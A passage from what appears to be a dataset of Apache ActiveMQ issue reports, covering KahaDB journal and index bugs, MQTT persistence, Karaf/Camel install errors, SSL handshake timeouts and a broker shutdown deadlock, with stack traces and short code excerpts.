CookiePolicy.BROWSER_COMPATIBILITY);Patch attached.
issueID:AMQ-6572
type:Bug
changed files:
texts:KahaDB journal may not handle max file length changes correctly
I was exploring the idea of changing the kahadb journal file length on an activemq instance which already has existing data (during a system restart).  Initial response from activemq insiders was that this was a supported action, but while examining the Journal source, i stumbled on code which would seem to indicate that it isn"t handled correctlySource thread: http://activemq.2283324.n4.nabble.com/Can-you-change-the-kahadb-journal-file-size-between-broker-starts-td4721155.html#a4721252Potential problem areas (from forum post):https://fisheye.apache.org/browse/activemq-6/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/journal/Journal.java?hb=true#to310This is the startup code.  it attempts to adjust the total length by shaving off an unused portion of the final data file.  if you have made the maxFileLength smaller since the last run, and you have actual data in the last journal file which is after the new maxFileLength, then this computation will incorrectly return a negative value.  my suspicion is that the length of the last data file should be used here instead of maxFileLength.https://fisheye.apache.org/browse/activemq-6/activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/journal/Journal.java?hb=true#to867likewise, this code attempts to handle adjustments to maxFileLength since the journal file was created, but i think it again fails.  if the maxFileLength has been increased since the data file was created, this would seem to be setting an offset which is past the length of the current data file.  again, it seems like the length of the data file should be used directly.in general, in order for this to work correctly, the maxFileLength should only be used for code which is creating new files.  all the other code should be solely relying on the size of the existing file, right?
issueID:AMQ-6575
type:Bug
changed files:
texts:Retained messages not persisted? (MQTT)
IssueRetained message is not persisted (after restart?)Steps to reproduce Client c1 connects and publishes a message m1 to topic t1  with retain: true and QoS: 2. Client then disconnects. Client connect (with same clientId or different, both works) and c1 subscribes to t1. c1 recieves m1.However, if the broker is restarted and step 2 is re-run, the m1 is never recieved.Shouldn"t a retained message with QoS-2 be persisted and send to clients even after restart?
issueID:AMQ-6576
type:Bug
changed files:
texts:Problem while installing activemq-camel with Camel 2.17.x or 2.18.x
After installing ActiveMQ with Camel 2.17.x or 2.18.x an error occurs after restart and the broker is no more available. The problem can be simply reproduced by following minimal installationkaraf@root()> feature:repo-add camel 2.17.5Adding feature url mvn:org.apache.camel.karaf/apache-camel/2.17.5/xml/featureskaraf@root()> feature:repo-add activemq 5.14.3Adding feature url mvn:org.apache.activemq/activemq-karaf/5.14.3/xml/featureskaraf@root()> feature:install -v activemq-camelAfter restart following error can be found in logCaused by: java.lang.ClassNotFoundException: org.apache.xbean.spring.context.v2.XBeanNamespaceHandler not found by org.apache.activemq.activemq-osgi [53]This problem has been described and analysed in Karaf dev mailing list http://karaf.922171.n3.nabble.com/ActiveMQ-and-Camel-2-17-x-on-Karaf-td4046427.html (see my last post)
issueID:AMQ-6577
type:Bug
changed files:
texts:TopicSubscription does not honor usePrefetchExtension
The current implementation of TopicSubscription always uses the prefetch extension feature, effectively ignoring any usePrefetchExtension option set in the configuration for the topic destination.
issueID:AMQ-6579
type:Bug
changed files:
texts:Expired messages counting as Dispatched on TopicSubscription
When a TopicSubscription is configured with a limit on the number of pending messages, it will try to eagerly evict expired messages before dispatching them.TopicSubscription.java:169if (!matched.isEmpty() && matched.size() > max) {  removeExpiredMessages();}When TopicSubscription#removeExpiredMessages detects an expired message, it will remove it but will increment the counter of dispatched messages as well.TopicSubscription.java:235if (node.isExpired()) {  matched.remove();  getSubscriptionStatistics().getDispatched().increment();  node.decrementReferenceCount();  if (broker.isExpired(node)) {    ((Destination) node.getRegionDestination()).getDestinationStatistics().getExpired().increment();    broker.messageExpired(getContext(), node, this);  }  break;}However this has the side effect of affecting the result of getDispatchedQueueSize() and therefore isFull(). These counters will now reflect a new dispatched message that has actually been dropped.In the worst case scenario slow consumers will no longer receive messages because they are "full" when in fact they have nothing to process.Am I correct in concluding that expired messages must not count towards the dispatched value?I have made a quick change, removing the increment, and things look good so far. However I am worried that I may be missing some side effect or specification detail.
issueID:AMQ-6584
type:Bug
changed files:
texts:ActiveMQ does not work on karaf 4.1.0
feature:repo-add activemq 5.14.3karaf@root()> feature:install activemq                                                                                              10:10:38Error executing command: Unable to resolve root: missing requirement &#91;root&#93; osgi.identity; osgi.identity=activemq; type=karaf.feature; version="&#91;5.14.3,5.14.3&#93;"; filter:="(&(osgi.identity=activemq)(type=karaf.feature)(version>=5.14.3)(version<=5.14.3))" [caused by: Unable to resolve activemq/5.14.3: missing requirement &#91;activemq/5.14.3&#93; osgi.identity; osgi.identity=activemq-client; type=karaf.feature; version="&#91;5.14.3,5.14.3&#93;" [caused by: Unable to resolve activemq-client/5.14.3: missing requirement &#91;activemq-client/5.14.3&#93; osgi.identity; osgi.identity=org.apache.activemq.activemq-osgi; type=osgi.bundle; version="&#91;5.14.3,5.14.3&#93;"; resolution:=mandatory [caused by: Unable to resolve org.apache.activemq.activemq-osgi/5.14.3: missing requirement &#91;org.apache.activemq.activemq-osgi/5.14.3&#93; osgi.wiring.package; filter:="(osgi.wiring.package=org.aopalliance.aop)"]]]karaf@root()> feature:install activemq-client                                                                                       10:10:41Error executing command: Unable to resolve root: missing requirement &#91;root&#93; osgi.identity; osgi.identity=activemq-client; type=karaf.feature; version="&#91;5.14.3,5.14.3&#93;"; filter:="(&(osgi.identity=activemq-client)(type=karaf.feature)(version>=5.14.3)(version<=5.14.3))" [caused by: Unable to resolve activemq-client/5.14.3: missing requirement &#91;activemq-client/5.14.3&#93; osgi.identity; osgi.identity=spring; type=karaf.feature; version="&#91;3.2.0,4.0.0)"&#93;
issueID:AMQ-6585
type:Improvement
changed files:
texts:Upgrade to Camel 2.19.x
Now that ActiveMQ version 5.15.0 is going to be Java 8 we can upgrade to the latest version of Camel 2.18.x.  The biggest challenge here is the OSGi portion as it will break because the new version of Camel was refactored a bit and spring dm was moved into its own module, etc. One issue I noticed is that Spring-xbean causes a problem because it still relies on Spring 3.2.x.
issueID:AMQ-6586
type:Bug
changed files:
texts:Compilation of activemq-unit-test fails
Compilation of activemq-unit-tests in activemq-5.14.x branch fails with following error[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.3:testCompile (default-testCompile) on project activemq-unit-tests: Compilation failure[ERROR] /home/kso/work/projects/asf/smx/workspace/activemq/activemq-unit-tests/src/test/java/org/apache/activemq/transport/tcp/TcpTransportCloseSocketTest.java:[128,24] local variable server is accessed from within inner class; needs to be declared finalThe problem is caused by cherry pick from master where it worked due to source target 1.8, but activemq-5.14.x branch has source target 1.7 and the final keyword is still necessary.
issueID:AMQ-6587
type:Bug
changed files:
texts:Failed to remove inactive destination Topic: Destination still has an active subscription
broker setSchedulePeriodForDestinationPurge, wildcard topic subscriber and anonymous publishers to new destinations. Race between addDestination and markForGc and canGcERROR region.RegionBroker: Failed to remove inactive destination Topic: destination=A.4725, subscriptions=1javax.jms.JMSException: Destination still has an active subscription: topic://A.4725 at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:271) at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:354) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:179) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:179) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:179) at org.apache.activemq.broker.region.RegionBroker.purgeInactiveDestinations(RegionBroker.java:897) at org.apache.activemq.broker.region.RegionBroker$1.run(RegionBroker.java:118) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505)
issueID:AMQ-6588
type:Improvement
changed files:TransportConnection.java
texts:TransportConnection to show client-id when reporting SecurityException
Please can we add the "clientId" to the WARNing log when reporting a SecurityException such as:2017-02-01 14:40:53,097 | WARN  | ActiveMQ NIO Worker 3    | TransportConnection              | ivemq.broker.TransportConnection  855 | 98 - org.apache.activemq.activemq-osgi - 5.14.0 | Failed to add Connection ID:myhost-50222-1485251692449-0:5 due to java.lang.SecurityException: User name [null] or password is invalid.It would really help to find out where the erroneous connection is coming from.
issueID:AMQ-659
type:Bug
changed files:DefaultJDBCAdapter.java
texts:Acked persistent messages redelivered after broker restart.
Originally reported on http://www.nabble.com/Message-Redelivery-after-startup%2C-potential-BUG-with-easy-test-case-t1337282.html#a3574070I confirmed that this is happening.
issueID:AMQ-6590
type:Bug
changed files:
texts:KahaDB index loses track of free pages on unclean shutdown
I have discovered an issue with the KahaDB index recovery after an unclean shutdown (OOM error, kill -9, etc) that leads to excessive disk space usage. Normally on clean shutdown the index stores the known set of free pages to db.free and reads that in on start up to know which pages can be re-used.  On an unclean shutdown this is not written to disk so on start up the index is supposed to scan the page file to figure out all of the free pages.Unfortunately it turns out that this scan of the page file is being done before the total page count value has been set so when the iterator is created it always thinks there are 0 pages to scan.The end result is that every time an unclean shutdown occurs all known free pages are lost and no longer tracked.  This of course means new free pages have to be allocated and all of the existing space is now lost which will lead to excessive index file growth over time.
issueID:AMQ-6591
type:Bug
changed files:
texts:Webconsole does not start in karaf 4.1.0 as an import is missing
2017-02-02 14:08:55,435 | ERROR | pool-3-thread-1  | WebObserver                      | 131 - org.ops4j.pax.web.pax-web-extender-war - 6.0.2 | Error scanning web bundle org.apache.activemq.activemq-web-console &#91;64&#93;: javax.servlet.annotation.HandlesTypes not found by org.apache.activemq.activemq-web-console &#91;64&#93;java.lang.ClassNotFoundException: javax.servlet.annotation.HandlesTypes not found by org.apache.activemq.activemq-web-console &#91;64&#93; at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1574) ~&#91;?:?&#93; at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79) ~&#91;?:?&#93; at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:2018) ~&#91;?:?&#93; at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ~&#91;?:?&#93; at org.apache.felix.framework.Felix.loadBundleClass(Felix.java:1925) ~&#91;?:?&#93; at org.apache.felix.framework.BundleImpl.loadClass(BundleImpl.java:978) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.parser.WebAppParser.servletContainerInitializerScan(WebAppParser.java:354) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.parser.WebAppParser.parse(WebAppParser.java:109) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.WebObserver.createExtension(WebObserver.java:145) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.Activator.doCreateExtension(Activator.java:82) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.createExtension(AbstractExtender.java:259) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.modifiedBundle(AbstractExtender.java:242) ~&#91;?:?&#93; at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender.modifiedBundle(AbstractExtender.java:54) ~&#91;?:?&#93; at org.osgi.util.tracker.BundleTracker$Tracked.customizerModified(BundleTracker.java:482) ~&#91;?:?&#93; at org.osgi.util.tracker.BundleTracker$Tracked.customizerModified(BundleTracker.java:415) ~&#91;?:?&#93;
issueID:AMQ-6595
type:Bug
changed files:
texts:Overly restrictive file mode on lib/*.jar files
It seems that the default file mode on the JAR files in the the distribution is 0600, which means that if you have the distribution files owned by, say, root, but are running as another used (with a separate ACTIVEMQ_HOME and ACTIVEMQ_BASE), then the application fails to start, as it cannot read its JAR files.$ tar tzvf ~/Downloads/apache-activemq-5.14.3-bin.tar.gz | grep "^-rw-------"-rw-------  0 cshannon domain users  2390 Dec 19 10:41 apache-activemq-5.14.3/examples/amqp/java/pom.xml-rw-------  0 cshannon domain users  2250 Dec 19 10:41 apache-activemq-5.14.3/examples/mqtt/java/pom.xml-rw-------  0 cshannon domain users  3251 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-composite-destinations/pom.xml-rw-------  0 cshannon domain users  3244 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-durable-sub/pom.xml-rw-------  0 cshannon domain users  3249 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-exclusive-consumer/pom.xml-rw-------  0 cshannon domain users  3230 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-message-browser/pom.xml-rw-------  0 cshannon domain users  3243 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-queue-selector/pom.xml-rw-------  0 cshannon domain users  3216 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-queue/pom.xml-rw-------  0 cshannon domain users  3246 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-temp-destinations/pom.xml-rw-------  0 cshannon domain users  3224 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-topic/pom.xml-rw-------  0 cshannon domain users  2300 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-transaction/pom.xml-rw-------  0 cshannon domain users  2278 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/jms-example-wildcard-consumer/pom.xml-rw-------  0 cshannon domain users  2909 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/advanced-scenarios/pom.xml-rw-------  0 cshannon domain users  2559 Dec 19 10:41 apache-activemq-5.14.3/examples/openwire/java/pom.xml-rw-------  0 cshannon domain users  2418 Dec 19 10:41 apache-activemq-5.14.3/examples/stomp/java/pom.xml-rw-------  0 cshannon domain users    33088 Feb  1  2016 apache-activemq-5.14.3/lib/slf4j-api-1.7.13.jar-rw-------  0 cshannon domain users   170538 Dec 19 10:37 apache-activemq-5.14.3/lib/activemq-spring-5.14.3.jar-rw-------  0 cshannon domain users  1169877 Dec 19 10:36 apache-activemq-5.14.3/lib/activemq-broker-5.14.3.jar-rw-------  0 cshannon domain users  1424591 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-client-5.14.3.jar-rw-------  0 cshannon domain users    32359 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-jms_1.1_spec-1.1.1.jar-rw-------  0 cshannon domain users    50155 Feb  1  2016 apache-activemq-5.14.3/lib/hawtbuf-1.11.jar-rw-------  0 cshannon domain users    20220 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-j2ee-management_1.1_spec-1.0.1.jar-rw-------  0 cshannon domain users   685732 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-openwire-legacy-5.14.3.jar-rw-------  0 cshannon domain users    14637 Feb  1  2016 apache-activemq-5.14.3/lib/geronimo-jta_1.0.1B_spec-1.0.1.jar-rw-------  0 cshannon domain users   665405 Dec 19 10:36 apache-activemq-5.14.3/lib/activemq-kahadb-store-5.14.3.jar-rw-------  0 cshannon domain users   147874 Apr 28  2016 apache-activemq-5.14.3/lib/activemq-protobuf-1.1.jar-rw-------  0 cshannon domain users   194851 Dec 19 10:37 apache-activemq-5.14.3/lib/activemq-console-5.14.3.jar-rw-------  0 cshannon domain users    37292 Dec 19 10:35 apache-activemq-5.14.3/lib/activemq-jaas-5.14.3.jar-rw-------  0 cshannon domain users   115649 Dec 19 10:40 apache-activemq-5.14.3/lib/activemq-web-5.14.3.jar-rw-------  0 cshannon domain users    16430 Feb  1  2016 apache-activemq-5.14.3/lib/jcl-over-slf4j-1.7.13.jar-rw-------  0 cshannon domain users    76321 Dec 19 10:39 apache-activemq-5.14.3/lib/camel/activemq-camel-5.14.3.jar-rw-------  0 cshannon domain users  1009602 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-core-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   359408 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-aop-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   712428 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-beans-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users  1026909 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-context-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   259078 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-expression-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   252921 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-tx-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   269749 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-jms-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   131184 Nov 22 07:03 apache-activemq-5.14.3/lib/optional/xbean-spring-4.2.jar-rw-------  0 cshannon domain users    20955 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-pool-5.14.3.jar-rw-------  0 cshannon domain users    52591 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-jms-pool-5.14.3.jar-rw-------  0 cshannon domain users   111969 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-pool2-2.4.2.jar-rw-------  0 cshannon domain users   102578 Apr 28  2016 apache-activemq-5.14.3/lib/optional/activeio-core-3.1.4.jar-rw-------  0 cshannon domain users   179452 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-jdbc-store-5.14.3.jar-rw-------  0 cshannon domain users   303658 May 23  2016 apache-activemq-5.14.3/lib/optional/commons-net-3.5.jar-rw-------  0 cshannon domain users   973038 Dec 19 10:37 apache-activemq-5.14.3/lib/optional/activemq-leveldb-store-5.14.3.jar-rw-------  0 cshannon domain users  5577112 Feb  1  2016 apache-activemq-5.14.3/lib/optional/scala-library-2.11.0.jar-rw-------  0 cshannon domain users    27253 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtbuf-proto-1.11.jar-rw-------  0 cshannon domain users    82869 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-scala-2.11-1.22.jar-rw-------  0 cshannon domain users   119139 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-1.22.jar-rw-------  0 cshannon domain users     9242 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldb-api-0.6.jar-rw-------  0 cshannon domain users   228800 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldb-0.6.jar-rw-------  0 cshannon domain users  1795936 Feb  1  2016 apache-activemq-5.14.3/lib/optional/guava-12.0.jar-rw-------  0 cshannon domain users    56364 Feb  1  2016 apache-activemq-5.14.3/lib/optional/leveldbjni-1.8.jar-rw-------  0 cshannon domain users    19705 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtjni-runtime-1.9.jar-rw-------  0 cshannon domain users   704708 Feb  1  2016 apache-activemq-5.14.3/lib/optional/snappy-java-1.1.2.jar-rw-------  0 cshannon domain users    48720 Feb  1  2016 apache-activemq-5.14.3/lib/optional/snappy-0.2.jar-rw-------  0 cshannon domain users   258875 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-core-2.6.3.jar-rw-------  0 cshannon domain users    46989 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-annotations-2.6.3.jar-rw-------  0 cshannon domain users  1170801 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jackson-databind-2.6.3.jar-rw-------  0 cshannon domain users   588337 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-collections-3.2.2.jar-rw-------  0 cshannon domain users   284220 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-lang-2.6.jar-rw-------  0 cshannon domain users   233859 May 23  2016 apache-activemq-5.14.3/lib/optional/commons-beanutils-1.9.2.jar-rw-------  0 cshannon domain users   449505 Feb  1  2016 apache-activemq-5.14.3/lib/optional/velocity-1.7.jar-rw-------  0 cshannon domain users   207408 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.apache.servicemix.bundles.josql-1.5_5.jar-rw-------  0 cshannon domain users   129265 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jasypt-1.9.2.jar-rw-------  0 cshannon domain users   102718 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-mqtt-5.14.3.jar-rw-------  0 cshannon domain users   127821 Feb  1  2016 apache-activemq-5.14.3/lib/optional/hawtdispatch-transport-1.22.jar-rw-------  0 cshannon domain users   108429 Dec 19 10:36 apache-activemq-5.14.3/lib/optional/activemq-stomp-5.14.3.jar-rw-------  0 cshannon domain users    25348 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-partition-5.14.3.jar-rw-------  0 cshannon domain users    47974 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.linkedin.zookeeper-impl-1.4.0.jar-rw-------  0 cshannon domain users   792964 Feb  1  2016 apache-activemq-5.14.3/lib/optional/zookeeper-3.4.6.jar-rw-------  0 cshannon domain users   489884 Feb  1  2016 apache-activemq-5.14.3/lib/optional/log4j-1.2.17.jar-rw-------  0 cshannon domain users   153425 Feb  1  2016 apache-activemq-5.14.3/lib/optional/org.linkedin.util-core-1.4.0.jar-rw-------  0 cshannon domain users     8704 Feb  1  2016 apache-activemq-5.14.3/lib/optional/slf4j-log4j12-1.7.13.jar-rw-------  0 cshannon domain users  1655658 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-runtime-config-5.14.3.jar-rw-------  0 cshannon domain users   128383 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jaxb2-basics-runtime-0.6.4.jar-rw-------  0 cshannon domain users   169534 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-amqp-5.14.3.jar-rw-------  0 cshannon domain users   717280 Dec 15 14:37 apache-activemq-5.14.3/lib/optional/proton-j-0.16.0.jar-rw-------  0 cshannon domain users    14136 Dec 19 10:39 apache-activemq-5.14.3/lib/optional/activemq-log4j-appender-5.14.3.jar-rw-------  0 cshannon domain users   105051 Dec 19 10:38 apache-activemq-5.14.3/lib/optional/activemq-http-5.14.3.jar-rw-------  0 cshannon domain users   736658 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/httpclient-4.5.2.jar-rw-------  0 cshannon domain users   327373 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/httpcore-4.4.5.jar-rw-------  0 cshannon domain users   263965 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-codec-1.9.jar-rw-------  0 cshannon domain users   549133 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/xstream-1.4.9.jar-rw-------  0 cshannon domain users   120069 Feb  1  2016 apache-activemq-5.14.3/lib/optional/xpp3-1.1.4c.jar-rw-------  0 cshannon domain users    44303 Dec 19 10:39 apache-activemq-5.14.3/lib/optional/activemq-shiro-5.14.3.jar-rw-------  0 cshannon domain users   379541 Feb  1  2016 apache-activemq-5.14.3/lib/optional/shiro-core-1.2.4.jar-rw-------  0 cshannon domain users    25565 Feb  1  2016 apache-activemq-5.14.3/lib/optional/shiro-spring-1.2.4.jar-rw-------  0 cshannon domain users   174167 Feb  1  2016 apache-activemq-5.14.3/lib/optional/commons-dbcp2-2.1.1.jar-rw-------  0 cshannon domain users   204950 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jmdns-3.4.1.jar-rw-------  0 cshannon domain users    37477 Feb  1  2016 apache-activemq-5.14.3/lib/optional/geronimo-j2ee-connector_1.5_spec-2.0.0.jar-rw-------  0 cshannon domain users    82930 Feb  1  2016 apache-activemq-5.14.3/lib/optional/spring-oxm-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users    87770 Nov 14 07:36 apache-activemq-5.14.3/lib/optional/jettison-1.3.8.jar-rw-------  0 cshannon domain users    48057 Feb  1  2016 apache-activemq-5.14.3/lib/optional/jasypt-spring31-1.9.2.jar-rw-------  0 cshannon domain users    22488 Feb  1  2016 apache-activemq-5.14.3/lib/optional/insight-log-core-1.2.0.Beta4.jar-rw-------  0 cshannon domain users   115489 Feb  1  2016 apache-activemq-5.14.3/lib/optional/insight-log4j-1.2.0.Beta4.jar-rw-------  0 cshannon domain users   126960 Sep 12 08:04 apache-activemq-5.14.3/lib/extra/mqtt-client-1.14.jar-rw-------  0 cshannon domain users  2803647 Feb  1  2016 apache-activemq-5.14.3/lib/web/jetty-all-9.2.13.v20150730.jar-rw-------  0 cshannon domain users   219683 Feb  1  2016 apache-activemq-5.14.3/lib/web/rome-1.0.jar-rw-------  0 cshannon domain users   153253 Feb  1  2016 apache-activemq-5.14.3/lib/web/jdom-1.0.jar-rw-------  0 cshannon domain users   786528 Feb  1  2016 apache-activemq-5.14.3/lib/web/spring-webmvc-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   722282 Feb  1  2016 apache-activemq-5.14.3/lib/web/spring-web-4.1.9.RELEASE.jar-rw-------  0 cshannon domain users   244274 Feb  1  2016 apache-activemq-5.14.3/lib/web/tomcat-servlet-api-8.0.24.jar-rw-------  0 cshannon domain users    36603 Feb  1  2016 apache-activemq-5.14.3/lib/web/tomcat-websocket-api-8.0.24.jar-rw-------  0 cshannon domain users    12452 Feb  1  2016 apache-activemq-5.14.3/lib/web/geronimo-annotation_1.0_spec-1.1.1.jar-rw-------  0 cshannon domain users    53297 Feb  1  2016 apache-activemq-5.14.3/lib/web/asm-5.0.4.jar-rw-------  0 cshannon domain users    10701 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jsp-9.2.13.v20150730.jar-rw-------  0 cshannon domain users   955429 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jsp-8.0.9.M3.jar-rw-------  0 cshannon domain users   237638 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-el-8.0.9.M3.jar-rw-------  0 cshannon domain users  1764622 Feb  1  2016 apache-activemq-5.14.3/lib/web/org.eclipse.jdt.core-3.8.2.v20130121.jar-rw-------  0 cshannon domain users     3236 Feb  1  2016 apache-activemq-5.14.3/lib/web/apache-jstl-9.2.13.v20150730.jar-rw-------  0 cshannon domain users    40153 Nov 14 07:36 apache-activemq-5.14.3/lib/web/taglibs-standard-spec-1.2.5.jar-rw-------  0 cshannon domain users   206430 Nov 14 07:36 apache-activemq-5.14.3/lib/web/taglibs-standard-impl-1.2.5.jar-rw-------  0 cshannon domain users   326745 Feb 22  2016 apache-activemq-5.14.3/lib/web/jolokia-core-1.3.3.jar-rw-------  0 cshannon domain users    23931 Feb  1  2016 apache-activemq-5.14.3/lib/web/json-simple-1.1.1.jar
issueID:AMQ-6597
type:Bug
changed files:
texts:activemq-camel does not work together with camel 2.18
Start apache karaf 4.1.0 and execute these commands in the console:feature:repo-add activemq 5.14.3feature:repo-add spring-legacy 4.1.0feature:repo-add camel 2.18.2feature:install activemq-broker activemq-camelThe activemq-camel bundle sometimes does not resolve and we get a Uses constraint violation error:http://apaste.info/3GSjxI then deploy this blueprint into the deploy folder: http://apaste.info/i3UhcStrangely when I use the org.apache.activemq.camel.component.ActiveMQComponent in a blueprint I get a strange error like below http://apaste.info/d3f4sThis might be a dynamic package import thing again. Not sure though.
issueID:AMQ-6599
type:Bug
changed files:
texts:MQTT+NIO+SSL transport: transport.soTimeout is not applied during SSL handshake
Currently I have trouble with many established TCP connections and threads hanging in the NIO+SSL handshake step. The hardware devices I use often have problems during SSL handshake and do not respond any more. So I thought configuring a transport.soTimeout value should solve the problem of hanging connections, because something like the MQTT  transport.defaultKeepAlive check is not applicable in this step yet. But setting transport.soTimeout=30000 had no effect.I made a remote debug session to the ActiveMQ broker and saw lots of threads waiting at NIOSSLTransport.java Line 430:    int keyCount = selector.select(this.getSoTimeout());    if (keyCount == 0 && this.getSoTimeout() > 0 && ((System.currentTimeMillis() - now) >= this.getSoTimeout())) {        throw new SocketTimeoutException("Timeout during handshake");    }At this point this.getSoTimeout returns always 0, which results in infinite timeout.I tried to figure out why the soTimeout setting works not as configured and found the code where the NIOSSLTransport object is created: TcpTransportServer.java function doHandleSocket(Socket socket). Here in line 580:    options.putAll(transportOptions);The soTimeout value is already removed from the transportOptions but it was apperantly not applied to the relevant object.To solve my problem for now I tried if the transport.soTimeout configuration works in a MQTT+SSL Stack (without using NIO) and it worked.May you please be so kind and solve this issue, so that the transport.soTimeout configurations works during SSL handshake and payload transfer as well for NIO.
issueID:AMQ-660
type:New Feature
changed files:sap_db
MaxDBJDBCAdapter.java
texts:Add support for MaxDB
Originaly reported on the user mailing list:http://www.nabble.com/Adding-support-for-MaxDB-in-ActiveMQ-JDBC-persistence-layer-t1334466.html#a3572564
issueID:AMQ-6601
type:Bug
changed files:
texts:AMQ with master and slave broker, shutting down slave causes dead-lock
We have 2 karaf instances configured to be activemq brokers, broker-amq (b1) and broker2-amq (b2).They run on the same machine, use KahaDB with file locking.It does not matter if b1 or b2 is started first, it becomes the master.The other one, the slave, when shutting down - while the master is running - hits a dead-lock; it must be `kill -9`"d manually in the end.We have a classic dead-lock scenario.  I have attached a `jstack` output when the slave broker is shutting down.The race is on between thread #20 and thread #17.Thread #17 is in ActiveMQServiceFactory.destroy(ActiveMQServiceFactory.java:173)and thread #20 is inActiveMQServiceFactory.updated(ActiveMQServiceFactory.java:140)"CM Configuration Updater (ManagedServiceFactory Update: factoryPid=[org.apache.activemq.server])" #20 daemon prio=5 os_prio=0 tid=0x00007f793c160800 nid=0x7084 waiting on condition [0x00007f799819f000]   java.lang.Thread.State: TIMED_WAITING (sleeping)        at java.lang.Thread.sleep(Native Method)        at java.lang.Thread.sleep(Thread.java:340)        at java.util.concurrent.TimeUnit.sleep(TimeUnit.java:386)        at org.apache.activemq.store.SharedFileLocker.doStart(SharedFileLocker.java:83)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.broker.LockableServiceSupport.preStart(LockableServiceSupport.java:94)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:54)        at org.apache.activemq.broker.BrokerService.doStartPersistenceAdapter(BrokerService.java:674)        at org.apache.activemq.broker.BrokerService.startPersistenceAdapter(BrokerService.java:658)        at 